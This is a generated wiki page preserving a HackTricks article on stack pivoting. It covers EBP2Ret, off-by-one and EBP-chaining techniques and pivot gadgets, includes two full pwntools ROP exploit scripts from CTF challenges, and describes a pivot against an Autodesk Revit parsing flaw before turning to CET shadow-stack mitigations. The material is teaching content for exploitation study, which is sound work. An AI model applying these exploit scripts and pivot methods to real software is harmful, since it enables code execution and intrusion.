---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Stack Pivoting

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-binary-exploitation-stack-overflow-stack-pivoting` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/binary-exploitation/stack-overflow/stack-pivoting.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Stack Pivoting](../../topics/binary-exploitation/stack-pivoting.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-binary-exploitation-stack-overflow-stack-pivoting |
| name | Stack Pivoting |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/binary-exploitation/stack-overflow/stack-pivoting.md |

## Preserved Source Material

````yaml
_body: "# Stack Pivoting\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic Information\n\nThis technique exploits\
  \ the ability to manipulate the **Base Pointer (EBP/RBP)** to chain the execution of multiple functions through careful\
  \ use of the frame pointer and the **`leave; ret`** instruction sequence.\n\nAs a reminder, on x86/x86-64 **`leave`** is\
  \ equivalent to:\n\n```\nmov       rsp, rbp   ; mov esp, ebp on x86\npop       rbp        ; pop ebp on x86\n```\n\nAnd as\
  \ the saved **EBP/RBP is in the stack** before the saved EIP/RIP, it's possible to control it by controlling the stack.\n\
  \n> Notes\n> - On 64-bit, replace EBP→RBP and ESP→RSP. Semantics are the same.\n> - Some compilers omit the frame pointer\
  \ (see “EBP might not be used”). In that case, `leave` might not appear and this technique won’t work.\n\n### EBP2Ret\n\n\
  This technique is particularly useful when you can **alter the saved EBP/RBP but have no direct way to change EIP/RIP**.\
  \ It leverages the function epilogue behavior.\n\nIf, during `fvuln`'s execution, you manage to inject a **fake EBP** in\
  \ the stack that points to an area in memory where your shellcode/ROP chain address is located (plus 8 bytes on amd64 /\
  \ 4 bytes on x86 to account for the `pop`), you can indirectly control RIP. As the function returns, `leave` sets RSP to\
  \ the crafted location and the subsequent `pop rbp` decreases RSP, **effectively making it point to an address stored by\
  \ the attacker there**. Then `ret` will use that address.\n\nNote how you **need to know 2 addresses**: the address where\
  \ ESP/RSP is going to go, and the value stored at that address that `ret` will consume.\n\n#### Exploit Construction\n\n\
  First you need to know an **address where you can write arbitrary data/addresses**. RSP will point here and **consume the\
  \ first `ret`**.\n\nThen, you need to choose the address used by `ret` that will **transfer execution**. You could use:\n\
  \n- A valid [**ONE_GADGET**](https://github.com/david942j/one_gadget) address.\n- The address of **`system()`** followed\
  \ by the appropriate return and arguments (on x86: `ret` target = `&system`, then 4 junk bytes, then `&\"/bin/sh\"`).\n\
  - The address of a **`jmp esp;`** gadget ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) followed\
  \ by inline shellcode.\n- A [**ROP**](../rop-return-oriented-programing/index.html) chain staged in writable memory.\n\n\
  Remember that before any of these addresses in the controlled area, there must be **space for the `pop ebp/rbp`** from `leave`\
  \ (8B on amd64, 4B on x86). You can abuse these bytes to set a **second fake EBP** and keep control after the first call\
  \ returns.\n\n#### Off-By-One Exploit\n\nThere's a variant used when you can **only modify the least significant byte of\
  \ the saved EBP/RBP**. In such a case, the memory location storing the address to jump to with **`ret`** must share the\
  \ first three/five bytes with the original EBP/RBP so a 1-byte overwrite can redirect it. Usually the low byte (offset 0x00)\
  \ is increased to jump as far as possible within a nearby page/aligned region.\n\nIt’s also common to use a RET sled in\
  \ the stack and put the real ROP chain at the end to make it more probable that the new RSP points inside the sled and the\
  \ final ROP chain is executed.\n\n### EBP Chaining\n\nBy placing a controlled address in the saved `EBP` slot of the stack\
  \ and a `leave; ret` gadget in `EIP/RIP`, it's possible to **move `ESP/RSP` to an attacker-controlled address**.\n\nNow\
  \ `RSP` is controlled and the next instruction is `ret`. Place in the controlled memory something like:\n\n- `&(next fake\
  \ EBP)` -> Loaded by `pop ebp/rbp` from `leave`.\n- `&system()` -> Called by `ret`.\n- `&(leave;ret)` -> After `system`\
  \ ends, moves RSP to the next fake EBP and continues.\n- `&(\"/bin/sh\")` -> Argument for `system`.\n\nThis way it's possible\
  \ to chain several fake EBPs to control the flow of the program.\n\nThis is like a [ret2lib](../rop-return-oriented-programing/ret2lib/index.html),\
  \ but more complex and only useful in edge-cases.\n\nMoreover, here you have an [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)\
  \ that uses this technique with a **stack leak** to call a winning function. This is the final payload from the page:\n\n\
  ```python\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln')\np = process()\n\np.recvuntil('to: ')\nbuffer = int(p.recvline(),\
  \ 16)\nlog.success(f'Buffer: {hex(buffer)}')\n\nLEAVE_RET = 0x40117c\nPOP_RDI = 0x40122b\nPOP_RSI_R15 = 0x401229\n\npayload\
  \ = flat(\n    0x0,               # rbp (could be the address of another fake RBP)\n    POP_RDI,\n    0xdeadbeef,\n    POP_RSI_R15,\n\
  \    0xdeadc0de,\n    0x0,\n    elf.sym['winner']\n)\n\npayload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)\n\
  \npayload += flat(\n    buffer,         # Load leaked address in RBP\n    LEAVE_RET       # Use leave to move RSP to the\
  \ user ROP chain and ret to execute it\n)\n\npause()\np.sendline(payload)\nprint(p.recvline())\n```\n\n> amd64 alignment\
  \ tip: System V ABI requires 16-byte stack alignment at call sites. If your chain calls functions like `system`, add an\
  \ alignment gadget (e.g., `ret`, or `sub rsp, 8 ; ret`) before the call to maintain alignment and avoid `movaps` crashes.\n\
  \n## EBP might not be used\n\nAs [**explained in this post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1),\
  \ if a binary is compiled with some optimizations or with frame-pointer omission, the **EBP/RBP never controls ESP/RSP**.\
  \ Therefore, any exploit working by controlling EBP/RBP will fail because the prologue/epilogue doesn’t restore from the\
  \ frame pointer.\n\n- Not optimized / frame pointer used:\n\n```bash\npush   %ebp         # save ebp\nmov    %esp,%ebp \
  \   # set new ebp\nsub    $0x100,%esp  # increase stack size\n.\n.\n.\nleave               # restore ebp (leave == mov %ebp,\
  \ %esp; pop %ebp)\nret                 # return\n```\n\n- Optimized / frame pointer omitted:\n\n```bash\npush   %ebx   \
  \      # save callee-saved register\nsub    $0x100,%esp  # increase stack size\n.\n.\n.\nadd    $0x10c,%esp  # reduce stack\
  \ size\npop    %ebx         # restore\nret                 # return\n```\n\nOn amd64 you’ll often see `pop rbp ; ret` instead\
  \ of `leave ; ret`, but if the frame pointer is omitted entirely then there’s no `rbp`-based epilogue to pivot through.\n\
  \n## Other ways to control RSP\n\n### `pop rsp` gadget\n\n[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp)\
  \ you can find an example using this technique. For that challenge it was needed to call a function with 2 specific arguments,\
  \ and there was a **`pop rsp` gadget** and there is a **leak from the stack**:\n\n```python\n# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp\n\
  # This version has added comments\n\nfrom pwn import *\n\nelf = context.binary = ELF('./vuln')\np = process()\n\np.recvuntil('to:\
  \ ')\nbuffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user\nlog.success(f'Buffer:\
  \ {hex(buffer)}')\n\nPOP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret\nPOP_RDI = 0x40122b\nPOP_RSI_R15 =\
  \ 0x401229     # pop RSI and R15\n\n# The payload starts\npayload = flat(\n    0,                 # r13\n    0,        \
  \         # r14\n    0,                 # r15\n    POP_RDI,\n    0xdeadbeef,\n    POP_RSI_R15,\n    0xdeadc0de,\n    0x0,\
  \               # r15\n    elf.sym['winner']\n)\n\npayload = payload.ljust(104, b'A')     # pad to 104\n\n# Start popping\
  \ RSP, this moves the stack to the leaked address and\n# continues the ROP chain in the prepared payload\npayload += flat(\n\
  \    POP_CHAIN,\n    buffer             # rsp\n)\n\npause()\np.sendline(payload)\nprint(p.recvline())\n```\n\n### xchg <reg>,\
  \ rsp gadget\n\n```\npop <reg>                <=== return pointer\n<reg value>\nxchg <reg>, rsp\n```\n\n### jmp esp\n\n\
  Check the ret2esp technique here:\n\n\n{{#ref}}\n../rop-return-oriented-programing/ret2esp-ret2reg.md\n{{#endref}}\n\n###\
  \ Finding pivot gadgets quickly\n\nUse your favorite gadget finder to search for classic pivot primitives:\n\n- `leave ;\
  \ ret` on functions or in libraries\n- `pop rsp` / `xchg rax, rsp ; ret`\n- `add rsp, <imm> ; ret` (or `add esp, <imm> ;\
  \ ret` on x86)\n\nExamples:\n\n```bash\n# Ropper\nropper --file ./vuln --search \"leave; ret\"\nropper --file ./vuln --search\
  \ \"pop rsp\"\nropper --file ./vuln --search \"xchg rax, rsp ; ret\"\n\n# ROPgadget\nROPgadget --binary ./vuln --only \"\
  leave|xchg|pop rsp|add rsp\"\n```\n\n### Classic pivot staging pattern\n\nA robust pivot strategy used in many CTFs/exploits:\n\
  \n1) Use a small initial overflow to call `read`/`recv` into a large writable region (e.g., `.bss`, heap, or mapped RW memory)\
  \ and place a full ROP chain there.\n2) Return into a pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) to\
  \ move RSP to that region.\n3) Continue with the staged chain (e.g., leak libc, call `mprotect`, then `read` shellcode,\
  \ then jump to it).\n\n### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)\n\nClient-side parsers sometimes\
  \ implement destructor loops that indirectly call a function pointer derived from attacker-controlled object fields. If\
  \ each iteration offers exactly one indirect call (a “one-gadget” machine), you can convert this into a reliable stack pivot\
  \ and ROP entry.\n\nObserved in Autodesk Revit RFA deserialization (CVE-2025-5037):\n\n- Crafted objects of type `AString`\
  \ place a pointer to attacker bytes at offset 0.\n- The destructor loop effectively executes one gadget per object:\n\n\
  ```asm\nrcx = [rbx]              ; object pointer (AString*)\nrax = [rcx]              ; pointer to controlled buffer\n\
  call qword ptr [rax]     ; execute [rax] once per object\n```\n\nTwo practical pivots:\n\n- Windows 10 (32-bit heap addrs):\
  \ misaligned “monster gadget” that contains `8B E0` → `mov esp, eax`, eventually `ret`, to pivot from the call primitive\
  \ to a heap-based ROP chain.\n- Windows 11 (full 64-bit addrs): use two objects to drive a constrained weird-machine pivot:\n\
  \  - Gadget 1: `push rax ; pop rbp ; ret` (move original rax into rbp)\n  - Gadget 2: `leave ; ... ; ret` (becomes `mov\
  \ rsp, rbp ; pop rbp ; ret`), pivoting into the first object’s buffer, where a conventional ROP chain follows.\n\nTips for\
  \ Windows x64 after the pivot:\n\n- Respect the 0x20-byte shadow space and maintain 16-byte alignment before `call` sites.\
  \ It’s often convenient to place literals above the return address and use a gadget like `lea rcx, [rsp+0x20] ; call rax`\
  \ followed by `pop rax ; ret` to pass stack addresses without corrupting control flow.\n- Non-ASLR helper modules (if present)\
  \ provide stable gadget pools and imports such as `LoadLibraryW`/`GetProcAddress` to dynamically resolve targets like `ucrtbase!system`.\n\
  - Creating missing gadgets via a writable thunk: if a promising sequence ends in a `call` through a writable function pointer\
  \ (e.g., DLL import thunk or function pointer in .data), overwrite that pointer with a benign single-step like `pop rax\
  \ ; ret`. The sequence then behaves like it ended with `ret` (e.g., `mov rdx, rsi ; mov rcx, rdi ; ret`), which is invaluable\
  \ to load Windows x64 arg registers without clobbering others.\n\nFor full chain construction and gadget examples, see the\
  \ reference below.\n\n## Modern mitigations that break stack pivoting (CET/Shadow Stack)\n\nModern x86 CPUs and OSes increasingly\
  \ deploy **CET Shadow Stack (SHSTK)**. With SHSTK enabled, `ret` compares the return address on the normal stack with a\
  \ hardware-protected shadow stack; any mismatch raises a Control-Protection fault and kills the process. Therefore, techniques\
  \ like EBP2Ret/leave;ret-based pivots will crash as soon as the first `ret` is executed from a pivoted stack.\n\n- For background\
  \ and deeper details see:\n\n\n{{#ref}}\n../common-binary-protections-and-bypasses/cet-and-shadow-stack.md\n{{#endref}}\n\
  \n- Quick checks on Linux:\n\n```bash\n# 1) Is the binary/toolchain CET-marked?\nreadelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'\n\
  \n# 2) Is the CPU/kernel capable?\ngrep -E 'user_shstk|ibt' /proc/cpuinfo\n\n# 3) Is SHSTK active for this process?\ngrep\
  \ -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)\n\n# 4) In pwndbg (gdb), checksec shows\
  \ SHSTK/IBT flags\n(gdb) checksec\n```\n\n- Notes for labs/CTF:\n  - Some modern distros enable SHSTK for CET-enabled binaries\
  \ when hardware and glibc support is present. For controlled testing in VMs, SHSTK can be disabled system-wide via the kernel\
  \ boot parameter `nousershstk`, or selectively enabled via glibc tunables during startup (see references). Don’t disable\
  \ mitigations on production targets.\n  - JOP/COOP or SROP-based techniques might still be viable on some targets, but SHSTK\
  \ specifically breaks `ret`-based pivots.\n\n- Windows note: Windows 10+ exposes user-mode and Windows 11 adds kernel-mode\
  \ “Hardware-enforced Stack Protection” built on shadow stacks. CET-compatible processes prevent stack pivoting/ROP at `ret`;\
  \ developers opt-in via CETCOMPAT and related policies (see reference).\n\n## ARM64\n\nIn ARM64, the **prologue and epilogues**\
  \ of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't\
  \ return to the address pointed by SP, but **to the address inside `x30`**.\n\nTherefore, by default, just abusing the epilogue\
  \ you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to\
  \ control the SP you would still need a way to **control the `x30`** register.\n\n- prologue\n\n  ```armasm\n  sub sp, sp,\
  \ 16\n  stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30\n  mov x29, sp             // FP points to frame record\n\
  \  ```\n\n- epilogue\n\n  ```armasm\n  ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]\n  add sp, sp, 16\n  ret\n\
  \  ```\n\n> [!CAUTION]\n> The way to perform something similar to stack pivoting in ARM64 would be to be able to **control\
  \ the `SP`** (by controlling some register whose value is passed to `SP` or because for some reason `SP` is taking its address\
  \ from the stack and we have an overflow) and then **abuse the epilogue** to load the **`x30`** register from a **controlled\
  \ `SP`** and **`RET`** to it.\n\nAlso in the following page you can see the equivalent of **Ret2esp in ARM64**:\n\n\n{{#ref}}\n\
  ../rop-return-oriented-programing/ret2esp-ret2reg.md\n{{#endref}}\n\n## References\n\n- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)\n\
  - [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)\n\
  - [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)\n\
  \  - 64 bits, off by one exploitation with a rop chain starting with a ret sled\n- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)\n\
  \  - 64 bit, no relro, canary, nx and pie. The program grants a leak for stack or pie and a WWW of a qword. First get the\
  \ stack leak and use the WWW to go back and get the pie leak. Then use the WWW to create an eternal loop abusing `.fini_array`\
  \ entries + calling `__libc_csu_fini` ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)).\
  \ Abusing this \"eternal\" write, it's written a ROP chain in the .bss and end up calling it pivoting with RBP.\n- Linux\
  \ kernel documentation: Control-flow Enforcement Technology (CET) Shadow Stack — details on SHSTK, `nousershstk`, `/proc/$PID/status`\
  \ flags, and enabling via `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html\n- Microsoft Learn: Kernel Mode\
  \ Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection\n\
  - [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)\n\
  \n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: binary-exploitation/stack-overflow/stack-pivoting.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/binary-exploitation/stack-overflow/stack-pivoting.md
````
